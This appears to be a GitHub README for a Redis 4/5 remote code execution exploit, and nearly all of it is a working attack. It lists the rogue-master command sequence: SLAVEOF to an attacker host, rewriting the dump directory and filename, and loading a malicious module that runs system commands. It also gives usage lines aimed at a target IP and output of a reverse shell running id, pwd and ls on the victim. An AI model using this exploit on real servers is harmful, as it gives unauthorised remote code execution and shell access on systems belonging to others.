# Redis-RCE
### remote code execute for redis4 and redis5


#### python code from https://github.com/Ridter/redis-rce

![](./redis-rce.jpg)

`strings exp_lin.so |grep sys`

```
system
system.exec
sys_errlist.h
sys_nerr
sys_errlist
_sys_siglist

```

![](./redis-exec.jpg)
![](./redis-exec-result.jpg)

### system.exec
![](./redis-system-exec.jpg)

```
0x01 SLAVEOF 192.168.2.18 8989

0x02 config set dir /tmp

0x03 config set dbfilename exp_lin.so

0x04 MODULE LOAD /tmp/exp_lin.so

0x05 slaveof no one

0x06 system.exec id

���Auid=100(redis) gid=101(redis) groups=101(redis),101(redis)

```
https://raw.githubusercontent.com/RicterZ/RedisModules-ExecuteCommand/master/src/module.c

https://redis-module-redoc.readthedocs.io/en/latest/


### Usage:

`python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f module.so`
`python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_osx.so`
```
python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so
[*] Connecting to  10.10.20.166:6379...
[*] Listening on 192.168.2.18:21000
[*] Sending SLAVEOF command to server
Accepted connection from 192.168.2.18:3147
[*] Setting filename
[*] Tring to run payload
Accepted connection from 192.168.2.18:21000
[*] Closing rogue server...
Received backconnect, use exit to exit...
$
$ id
uid=100(redis) gid=101(redis) groups=101(redis),101(redis)
$ pwd
/tmp
$ ls
module.so
exp_lin.so
exp_osx.so
$


```

https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

https://github.com/Ridter
